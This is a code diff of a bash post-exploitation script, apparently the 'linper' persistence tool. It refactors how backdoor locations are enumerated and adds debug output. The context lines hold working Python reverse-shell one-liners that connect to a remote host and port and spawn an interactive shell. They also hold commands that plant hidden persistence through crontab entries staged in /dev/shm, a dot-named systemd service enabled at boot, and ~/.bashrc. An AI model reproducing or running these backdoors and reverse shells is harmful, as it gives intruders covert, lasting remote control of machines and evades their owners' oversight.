@@ -11,8 +11,7 @@ RPORT=5253
 CRON="* * * * *"
 EZID=$(mktemp -d)
 JJSFILE=$(mktemp)
-
-touch /dev/shm/.linpay
+PAYLOADFILE=$(mktemp)
 
 METHODS=(
 	# array entry format = method, eval statement, payload: <- the ":" is important, and the spaces around the commas
@@ -33,7 +32,6 @@ METHODS=(
 	"python2.7 , python2.7 -c 'import socket,subprocess,os;exit()' , python2.7 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$RHOST\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"$SHELL\",\"-i\"]);':"
 	"python3 , python3 -c 'import socket,subprocess,os;exit()' , python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$RHOST\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"$SHELL\",\"-i\"]);':"
 	"python3.8 , python3.8 -c 'import socket,subprocess,os;exit()' , python3.8 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$RHOST\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"$SHELL\",\"-i\"]);':"
-
 )
 
 # pass paylod to doors
@@ -56,18 +54,20 @@ enum_methods() {
 	done
 }
 
-DOORS=(
+
+
+# enumerate where all backdoors can be placed
+enum_doors() {
+	
+	DOORS=(
 	# array entry format = door , eval statement , hinge: <- the ":" is important, and the spaces around the commas
 	# door = command
 	# eval statement = same as above
 	# hinge = door hinge, haha get it? it is the command to actually be executed (piped to $SHELL) in order to install the backdoor, for each method. It will contain everything needed for the door to function properly (e.g. cron schedule, service details, backgrounding for bashrc, etc). The persistence *hinges* on this to be syntactically correct, literally :)
 	"crontab , crontab -l > /dev/shm/.cron; echo \"* * * * * echo linper\" >> /dev/shm/.cron; crontab /dev/shm/.cron; crontab -l > /dev/shm/.cron; cat /dev/shm/.cron | grep -v linper > /dev/shm/.rcron; crontab /dev/shm/.rcron; if grep -qi [A-Za-z0-9] /dev/shm/.rcron; then crontab /dev/shm/.rcron; else crontab -r; fi; grep linper -qi /dev/shm/.cron , echo \"$CRON $PUTPAYLOADHERE\" >> /dev/shm/.rcron; crontab /dev/shm/.rcron; rm /dev/shm/.rcron:"
 	"systemctl , find /etc/systemd/ -type d -writable | head -n 1 | grep -qi systemd , export temp_service=.$(mktemp -u | sed 's/.*\.//g').service; touch /etc/systemd/system/$temp_service; echo \"[Service]\" >> /etc/systemd/system/$temp_service; echo \"Type=oneshot\" >> /etc/systemd/system/$temp_service; echo \"ExecStartPre=$(which sleep) 60 \" >> /etc/systemd/system/$temp_service; echo \"ExecStart=$(which $SHELL) -c 'PUTPAYLOADHERE' \" >> /etc/systemd/system/$temp_service; echo \"[Install]\" >> /etc/systemd/system/$temp_service; echo \"WantedBy=multi-user.target\" >> /etc/systemd/system/$temp_service; chmod 644 /etc/systemd/system/$temp_service; systemctl start $temp_service 2> /dev/null & sleep .0001; systemctl enable $temp_service 2> /dev/null & sleep .0001; echo $temp_service:"
-	"bashrc , cd;find -writable -name .bashrc | grep -qi bashrc , echo \"PUTPAYLOADHERE 2> /dev/null & sleep .0001\" >> ~/.bashrc"
+	"bashrc , cd;find -writable -name .bashrc | grep -qi bashrc , echo \"$PAYLOAD 2> /dev/null & sleep .0001\" >> ~/.bashrc"
 )
-
-# enumerate where all backdoors can be placed
-enum_doors() {
 	IFS=":"
 	for s in ${DOORS[@]};
 	do
@@ -84,6 +84,8 @@ enum_doors() {
 					if echo $DOOR | grep -qi "[a-z]";
 					then
 						echo "[+] Door Found: $DOOR"
+						echo $PAYLOAD
+						echo $HINGE
 					fi
 				fi
 			fi
